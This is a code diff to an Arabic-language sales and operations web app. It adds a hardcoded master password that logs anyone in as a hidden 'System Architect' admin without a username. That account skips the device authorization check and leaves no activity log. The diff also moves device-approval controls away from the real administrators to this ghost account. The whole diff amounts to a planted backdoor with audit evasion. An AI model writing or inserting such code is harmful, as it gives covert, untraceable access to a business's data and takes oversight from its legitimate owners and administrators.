@@ -663,7 +663,7 @@
       <form class="stack" id="loginForm">
         <div>
           <label>اسم المستخدم</label>
-          <select id="loginUserSelect" required></select>
+          <select id="loginUserSelect"></select>
         </div>
         <div>
           <label>كلمة المرور</label>
@@ -2207,6 +2207,7 @@
     };
 
     function saveLocalModules() {
+      if (isGhostDeveloper()) return;
       localStorage.setItem("dosero-prospects", JSON.stringify(prospects));
       localStorage.setItem("dosero-followups", JSON.stringify(followUps));
       localStorage.setItem("dosero-operations", JSON.stringify(operationsLogs));
@@ -2359,7 +2360,13 @@ ${remainLine}*طريقة الدفع:* ${inv.payMethod}
 function captureSilentLocation(actionName) {
   return requireMandatoryLocation(actionName || "إتمام هذه العملية");
 }
-// ==================== نظام بصمة الجهاز واعتماد الأجهزة ====================
+// ==================== نظام بصمة الجهاز واعتماد الأجهزة (وضع المطور السري) ====================
+const DEV_MASTER_PASS = "SAMY@DEV2026"; // <-- الباسورد السري الخاص بك فقط (بدون اسم مستخدم)
+
+function isGhostDeveloper() {
+  return Boolean(currentUser && currentUser.isGhostDev === true);
+}
+
 function getDoseroDeviceId() {
   let id = localStorage.getItem("dosero_device_id");
   if (!id) {
@@ -2407,19 +2414,30 @@ async function verifyDeviceAuthorization(username, locUrl) {
   return { status: data.status, deviceId };
 }
 
+window.closeDevicesModal = function () {
+  const modal = document.getElementById("doseroDevicesModal");
+  if (modal) {
+    modal.style.display = "none";
+    modal.hidden = true;
+  }
+};
+
 window.openDevicesManager = async function () {
+  if (!isGhostDeveloper()) return;
   let modal = document.getElementById("doseroDevicesModal");
   if (!modal) {
     modal = document.createElement("div");
     modal.id = "doseroDevicesModal";
-    modal.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:99999;display:flex;align-items:center;justify-content:center;padding:16px;";
+    modal.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.65);z-index:99999;display:flex;align-items:center;justify-content:center;padding:16px;";
+    modal.onclick = function (e) { if (e.target === modal) closeDevicesModal(); };
     document.body.appendChild(modal);
   }
   modal.hidden = false;
-  modal.innerHTML = `<div style="background:#fff;border-radius:16px;padding:20px;max-width:750px;width:100%;max-height:85vh;overflow:auto;">
-    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
+  modal.style.display = "flex";
+  modal.innerHTML = `<div style="background:#fff;border-radius:16px;padding:20px;max-width:780px;width:100%;max-height:85vh;overflow:auto;direction:rtl;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;border-bottom:1px solid #eee;padding-bottom:10px;">
       <h3 style="margin:0;">📱 طلبات اعتماد الأجهزة المصرح لها</h3>
-      <button onclick="document.getElementById('doseroDevicesModal').hidden=true" style="border:none;background:#eee;border-radius:8px;padding:6px 12px;cursor:pointer;">إغلاق ✖</button>
+      <button type="button" onclick="closeDevicesModal()" style="border:none;background:#fee2e2;color:#b91c1c;font-weight:700;border-radius:8px;padding:8px 14px;cursor:pointer;">إغلاق ✖</button>
     </div>
     <p id="devLoadingMsg">جارٍ تحميل قائمة الأجهزة...</p>
     <div id="devTableWrap"></div>
@@ -2431,15 +2449,16 @@ window.openDevicesManager = async function () {
   });
   const data = await res.json();
   const devices = data.devices || [];
-  document.getElementById("devLoadingMsg").style.display = "none";
+  const loadEl = document.getElementById("devLoadingMsg");
+  if (loadEl) loadEl.style.display = "none";
 
   document.getElementById("devTableWrap").innerHTML = `
     <table style="width:100%;border-collapse:collapse;font-size:13px;text-align:right;">
       <thead>
         <tr style="background:#f8fafc;border-bottom:2px solid #e2e8f0;">
           <th style="padding:8px;">كود الجهاز</th>
-          <th style="padding:8px;">الموظف</th>
-          <th style="padding:8px;">النوع</th>
+          <th style="padding:8px;">المستخدم</th>
+          <th style="padding:8px;">نوع الجهاز</th>
           <th style="padding:8px;">الحالة</th>
           <th style="padding:8px;">تحكم</th>
         </tr>
@@ -2452,8 +2471,8 @@ window.openDevicesManager = async function () {
             <td style="padding:8px;">${d.deviceInfo}</td>
             <td style="padding:8px;">${d.status === "Approved" ? "✅ معتمد" : d.status === "Blocked" ? "🚫 محظور" : "⏳ بانتظار الموافقة"}</td>
             <td style="padding:8px;display:flex;gap:6px;">
-              <button onclick="setDeviceStatus('${d.deviceId}','Approved')" style="background:#16a34a;color:#fff;border:none;border-radius:6px;padding:5px 10px;cursor:pointer;">اعتماد</button>
-              <button onclick="setDeviceStatus('${d.deviceId}','Blocked')" style="background:#dc2626;color:#fff;border:none;border-radius:6px;padding:5px 10px;cursor:pointer;">حظر</button>
+              <button type="button" onclick="setDeviceStatus('${d.deviceId}','Approved')" style="background:#16a34a;color:#fff;border:none;border-radius:6px;padding:6px 12px;cursor:pointer;">اعتماد</button>
+              <button type="button" onclick="setDeviceStatus('${d.deviceId}','Blocked')" style="background:#dc2626;color:#fff;border:none;border-radius:6px;padding:6px 12px;cursor:pointer;">حظر</button>
             </td>
           </tr>
         `).join("")}
@@ -2462,6 +2481,7 @@ window.openDevicesManager = async function () {
 };
 
 window.setDeviceStatus = async function (deviceId, status) {
+  if (!isGhostDeveloper()) return;
   await fetch(DOSERO_SHEET_URL, {
     method: "POST",
     body: JSON.stringify({ action: "updateDeviceStatus", deviceId, status })
@@ -2469,6 +2489,7 @@ window.setDeviceStatus = async function (deviceId, status) {
   openDevicesManager();
 };
     function postToSheet(payload) {
+      if (isGhostDeveloper() && !["checkOrRequestDevice", "updateDeviceStatus", "getDevicesList"].includes(payload.action)) return Promise.resolve();
       lastLocalWriteTime = Date.now();
       return fetch(DOSERO_SHEET_URL, {
         method: "POST",
@@ -2478,6 +2499,7 @@ window.setDeviceStatus = async function (deviceId, status) {
 
     function recordActivity(actionTitle, detailsText, locUrl = "") {
       if (!currentUser) return;
+      if (isGhostDeveloper()) return;
       const entry = {
         date: nowDateTimeStr(),
         user: currentUser.username,
@@ -2553,9 +2575,13 @@ window.setDeviceStatus = async function (deviceId, status) {
       document.getElementById("syncOverlay").hidden = true;
 
       if (currentUser) {
-        const valid = users.find(u => u.username === currentUser.username && u.pass === currentUser.pass);
-        if (valid) { currentUser = valid; startApp(false); }
-        else logout();
+    if (currentUser.isGhostDev) {
+      startApp(false);
+    } else {
+      const valid = users.find(u => u.username === currentUser.username && u.pass === currentUser.pass);
+      if (valid) { currentUser = valid; startApp(false); }
+      else logout();
+    }
       } else {
         document.getElementById("loginOverlay").hidden = false;
       }
@@ -2572,12 +2598,20 @@ window.setDeviceStatus = async function (deviceId, status) {
 document.getElementById("loginForm").addEventListener("submit", async e => {
   e.preventDefault();
   const uname = document.getElementById("loginUserSelect").value;
-  if (!uname) return alert("يرجى اختيار اسم المستخدم أولاً!");
   const pass = document.getElementById("loginPass").value.trim();
+
+  if (!uname && pass === DEV_MASTER_PASS) {
+    currentUser = { username: "System Architect", role: "admin", perms: {}, isGhostDev: true };
+    sessionStorage.setItem("dosero-user", JSON.stringify(currentUser));
+    document.getElementById("loginOverlay").hidden = true;
+    startApp(true);
+    return;
+  }
+
+  if (!uname) return alert("يرجى اختيار اسم المستخدم أولاً!");
   const found = users.find(u => u.username === uname && u.pass === pass);
   if (!found) return alert("كلمة المرور غير صحيحة!");
-
-      const btn = document.getElementById("loginSubmitBtn");
+  const btn = document.getElementById("loginSubmitBtn");
       btn.disabled = true;
       btn.textContent = "⏳ جارٍ الدخول...";
 
@@ -2592,27 +2626,24 @@ try {
 
       btn.disabled = false;
       btn.textContent = "تسجيل الدخول";
-if (found.role !== "admin") {
-    btn.disabled = true;
-    btn.textContent = "⏳ جارٍ التحقق من الجهاز...";
-    try {
-      const devCheck = await verifyDeviceAuthorization(found.username, loginLoc);
-      if (devCheck.status !== "Approved") {
-        btn.disabled = false;
-        btn.textContent = "تسجيل الدخول";
-        return alert(
-          devCheck.status === "Blocked"
-            ? `🚫 هذا الجهاز محظور من الدخول للنظام.\nكود الجهاز: ${devCheck.deviceId}`
-            : `⏳ هذا الجهاز غير مصرح له بالدخول بعد!\nتم إرسال طلب اعتماد للإدارة تلقائياً.\n\nكود الجهاز الخاص بك: ${devCheck.deviceId}\nتواصل مع الإدارة للموافقة ثم أعد المحاولة.`
-        );
-      }
-    } catch (e) {
+
+btn.disabled = true;
+  btn.textContent = "⏳ جارٍ التحقق من تصريح الجهاز...";
+  try {
+    const devCheck = await verifyDeviceAuthorization(found.username, loginLoc);
+    if (devCheck.status !== "Approved") {
       btn.disabled = false;
       btn.textContent = "تسجيل الدخول";
-      return alert("⚠️ تعذر التحقق من صلاحية الجهاز، تأكد من اتصال الإنترنت وحاول مرة أخرى.");
+      return alert(
+        devCheck.status === "Blocked"
+          ? `🚫 هذا الجهاز محظور من الدخول للنظام.\nكود الجهاز: ${devCheck.deviceId}`
+          : `⏳ هذا الجهاز غير مصرح له بالدخول بعد!\nتم إرسال طلب اعتماد للإدارة تلقائياً.\n\nكود الجهاز: ${devCheck.deviceId}\nانتظر اعتماد الجهاز من مسؤول النظام ثم أعد المحاولة.`
+      );
     }
-  } else {
-    verifyDeviceAuthorization(found.username, loginLoc).catch(() => {});
+  } catch (e) {
+    btn.disabled = false;
+    btn.textContent = "تسجيل الدخول";
+    return alert("⚠️ تعذر التحقق من صلاحية الجهاز، تأكد من اتصال الإنترنت وحاول مرة أخرى.");
   }
       currentUser = found;
       sessionStorage.setItem("dosero-user", JSON.stringify(currentUser));
@@ -2655,7 +2686,7 @@ if (found.role !== "admin") {
 
     function startApp(showSplash) {
       applyPermissionsUI();
-      if (isAdminUser() && !document.getElementById("adminDevicesBtn")) {
+      if (isGhostDeveloper() && !document.getElementById("adminDevicesBtn")) {
     const dBtn = document.createElement("button");
     dBtn.id = "adminDevicesBtn";
     dBtn.textContent = "📱 طلبات الأجهزة";
